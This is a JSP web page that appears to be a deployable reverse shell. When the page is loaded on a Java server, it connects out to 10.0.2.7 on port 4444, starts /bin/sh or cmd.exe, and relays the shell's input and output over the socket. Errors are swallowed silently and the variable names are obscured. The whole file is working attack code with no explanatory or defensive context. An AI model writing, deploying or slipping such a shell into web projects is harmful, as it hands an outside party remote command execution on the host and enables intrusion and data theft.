<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream vT;
    OutputStream xi;

    StreamConnector( InputStream vT, OutputStream xi )
    {
      this.vT = vT;
      this.xi = xi;
    }

    public void run()
    {
      BufferedReader qg  = null;
      BufferedWriter oPq = null;
      try
      {
        qg  = new BufferedReader( new InputStreamReader( this.vT ) );
        oPq = new BufferedWriter( new OutputStreamWriter( this.xi ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = qg.read( buffer, 0, buffer.length ) ) > 0 )
        {
          oPq.write( buffer, 0, length );
          oPq.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( qg != null )
          qg.close();
        if( oPq != null )
          oPq.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.0.2.7", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
